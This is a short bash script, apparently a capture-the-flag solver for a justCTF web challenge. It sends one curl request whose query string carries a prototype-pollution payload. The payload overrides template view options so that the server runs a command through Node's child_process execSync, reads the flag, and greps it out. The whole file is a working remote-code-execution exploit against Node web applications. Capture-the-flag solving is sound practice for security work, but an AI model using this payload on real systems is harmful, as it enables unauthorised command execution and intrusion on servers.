#!/bin/bash

# ./solver.sh terjanq.me:8000
curl -g -k -s "http://$1/product?name=watch&v[__proto__][]=1&&v[1]&v[2]&v[3]&v[4]&v[5]&v[_proto__][settings][view%20options][escape]=function(){return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)};&v[_proto__][settings][view%20options][client]=1&v[_proto__][settings][view%20cache]=&v[_proto__][cache]=" | grep -o -m 1 "justCTF{[^}]\+}"